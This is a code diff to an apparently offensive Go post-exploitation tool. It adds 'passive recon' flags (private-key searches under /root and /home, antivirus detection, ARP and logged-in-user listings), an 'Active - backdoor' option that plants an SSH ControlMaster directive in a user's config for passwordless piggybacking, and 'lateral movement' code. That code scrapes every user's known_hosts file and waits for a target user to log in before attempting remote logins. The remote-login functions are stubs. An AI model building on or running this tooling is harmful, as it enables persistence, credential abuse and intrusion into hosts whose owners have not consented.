@@ -13,33 +13,39 @@ import (
 	"strings"
 	"time"
 
+	//"golang.org/x/crypto/ssh"
+	//"golang.org/x/crypto/ssh/agent"
 	utmp "github.com/EricLagergren/go-gnulib/utmp"
 	netstat "github.com/drael/GOnetstat"
 	ps "github.com/unixist/go-ps"
 	netlink "github.com/vishvananda/netlink"
+	"github.com/willdonnelly/passwd"
 )
 
 // CLI flags
 var (
-	// Recon
-	flag_gatt       = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
-	flag_pkeys      = flag.Bool("pkeys", false, "Detect private keys")
-	flag_pkey_dirs  = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
-	flag_pkey_sleep = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
-	flag_av         = flag.Bool("av", false, "Check for signs of A/V services running or present.")
-	flag_container  = flag.Bool("container", false, "Detect if this system is running in a container.")
-	flag_net        = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
-	flag_watches    = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
-	flag_arp        = flag.Bool("arp", false, "Grab ARP table for all devices.")
-	flag_who        = flag.Bool("who", false, "List who's logged in and from where.")
-	// Recon over time
-	flag_poll_net   = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
-	flag_poll_users = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
+	// Passive recon
+	flag_gatt             = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
+	flag_pkeys            = flag.Bool("pkeys", false, "Detect private keys")
+	flag_pkey_dirs        = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
+	flag_pkey_sleep       = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
+	flag_av               = flag.Bool("av", false, "Check for signs of A/V services running or present.")
+	flag_container        = flag.Bool("container", false, "Detect if this system is running in a container. [UNRELIABLE]")
+	flag_net              = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
+	flag_watches          = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
+	flag_arp              = flag.Bool("arp", false, "Grab ARP table for all devices.")
+	flag_who              = flag.Bool("who", false, "List who's logged in and from where.")
+	// Passive recon over time
+	flag_poll_net         = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
+	flag_poll_users       = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
+	flag_stalk_luser      = flag.String("stalk-luser", "", "Wait until a user logs in locally and log it. Use \"*\" to match any user.")
 
-	// Non-recon
-	flag_stalk     = flag.String("stalk", "", "Wait until a user logs in and then do something. Use \"*\" to match any user.")
-	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
-	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Remove user's ControlMaster directive. If the config is empty after this, it will be removed.")
+	// Active - backdoor
+	flag_ssh_cm           = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
+	flag_rm_ssh_cm        = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
+	// Active - lateral movement
+	flag_stalk_ruser      = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
+	flag_stalk_ruser_cmd  = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
 )
 
 var (
@@ -58,7 +64,10 @@ var (
         ControlPersist 10m`
 )
 
-type stalkAction func(string) error
+// string parameter is the user who logged into this system.
+type localLoginStalkAction func(string, netConn) error
+// string parameter is the user who logged into a remote system.
+type remoteLoginStalkAction func(string, netConn) error
 
 type sshPrivateKey struct {
 	path      string
@@ -209,6 +218,8 @@ func runningProcs(procs []string) []process {
 	return found
 }
 
+// establishConns grabs currently established network connections
+// and looks for the connection characteristics in "needle".
 func establishedConns(conns []netConn, needle netConn) []netConn {
   found := []netConn{}
 
@@ -324,6 +335,15 @@ func getArp() []netlink.Neigh {
 	}
 }
 
+func isUserLoggedIn(user string) bool {
+	for _, w := range getWho() {
+		if w.user == user {
+			return true
+		}
+	}
+	return false
+}
+
 // getWho fetches information about currently logged-in users.
 func getWho() []who {
 	found := []who{}
@@ -418,15 +438,58 @@ func getNetworkConnections() []netConn {
   return found
 }
 
-// getCandidatePiggies gets likely list of hosts the user has SSH access to.
+func sshLoginWithAgent(user string, conn netConn) error {
+	return nil
+}
+
+// sshKnownHosts attempts to fetch all the known_hosts files for all users on
+// the system. It will fail in two cases: lack of permission; and hashed hosts.
+func sshKnownHosts() []netConn {
+	found := []netConn {}
+	entries, _ := passwd.Parse()
+
+	// Loop over all the users on the system and scrape their known_hosts file
+	for _, e := range entries {
+		filename := filepath.Join(e.Home, ".ssh/known_hosts")
+		if _, err := os.Stat(filename); err != nil {
+			continue
+		}
+		body, err := ioutil.ReadFile(filename)
+		if err != nil {
+			continue
+		}
+		for _, line := range strings.Split(string(body), "\n") {
+			if line == "" {
+				break
+			}
+			if strings.Index(line, "|") == 0 { // Hosts may be hashed
+				continue
+			}
+			hosts := strings.Split(line, " ")[0]
+			// Grab all the comma-separated hosts/IPs in the first column. Since known_hosts
+			// doesn't have port information, we'll have to assume tcp/22.
+			for _, host := range strings.Split(hosts, ",") {
+				found = append(found, netConn{
+					dstIp: host,
+					dstPort: 22,
+					l4Proto: L4ProtoTcp,
+				})
+			}
+		}
+	}
+
+	return found
+}
+
+// getCandidateRLogins gets likely list of hosts the user has SSH access to.
 // This basically boils down to getting of a list of established connections to
 // remote hosts on tcp/22.
-func getCandidatePiggies() ([]netConn) {
+func getCandidateRLogins() ([]netConn) {
   conns := getNetworkConnections()
-  return establishedConns(conns, netConn{
+  return append(establishedConns(conns, netConn{
     dstPort: 22,
     l4Proto: L4ProtoTcp,
-  })
+  }), sshKnownHosts()...)
 }
 
 func getSSHControlMasterFilename(user string) (string, error) {
@@ -568,9 +631,9 @@ func unsetSSHControlMaster(user string) error {
 	return nil
 }
 
-// stalkUser perform an action when a specific user logs in at any point in the future.
+// stalkLocalLogin performs an action when a specific user logs in at any point in the future.
 // If user == "*", any user will trigger the action.
-func stalkUser(user string, sa stalkAction) error {
+func stalkLocalLogin(user string, action localLoginStalkAction) error {
 	start := time.Now()
 	ticker := time.NewTicker(1 * time.Second)
 	//go func() {
@@ -579,7 +642,9 @@ func stalkUser(user string, sa stalkAction) error {
 		case <-ticker.C:
 			for _, w := range getWho() {
 				if (user == "*" || user == w.user) && start.Before(time.Unix(int64(w.time), 0)) {
-					sa(w.user)
+					action(w.user, netConn{
+							srcIp: w.host,
+					})
 					start = time.Now()
 				}
 			}
@@ -587,6 +652,34 @@ func stalkUser(user string, sa stalkAction) error {
 		}
 	}
 	//}()
+	return nil
+}
+
+// stalkRemoteLogin attempts to log into a remote system via two methods:
+// 1. If the Control Master socket is recently created, attempt to use it
+// 2. If an SSH connection to a remote host is made, attempt to use any keys
+//    loaded in the user's ssh-agent.
+func stalkRemoteLogin(user string, action remoteLoginStalkAction) error {
+	ticker := time.NewTicker(1 * time.Second)
+	for {
+		select {
+		case <-ticker.C:
+			if isUserLoggedIn(user) {
+				for _, c := range getCandidateRLogins() {
+					action(user, netConn{
+							dstIp: c.dstIp,
+							dstPort: c.dstPort,
+					})
+				}
+			}
+		}
+	}
+	return nil
+}
+
+// attemptRemoteLogin will wait for signs that 
+func attemptRemoteLogin(user string, conn netConn) error {
+	fmt.Printf("Attempting remote login as %s to %s:%d\n", user, conn.dstIp, conn.dstPort)
 	return nil
 }
 
@@ -669,8 +762,13 @@ func main() {
 		}
 		fmt.Println("")
 	}
-	if *flag_stalk != "" {
-		stalkUser(*flag_stalk, func(user string) error { fmt.Printf("User logged in! %s", user); return nil })
+	if *flag_stalk_luser != "" {
+		stalkLocalLogin(*flag_stalk_luser, func(user string, conn netConn) error {
+			fmt.Printf("User logged in %v: %s@%s\n", time.Now(), user, conn.srcIp); return nil
+		})
+	}
+	if *flag_stalk_ruser != "" {
+		stalkRemoteLogin(*flag_stalk_ruser, attemptRemoteLogin)
 	}
 	if *flag_ssh_cm != "" {
 		setSSHControlMaster(*flag_ssh_cm)
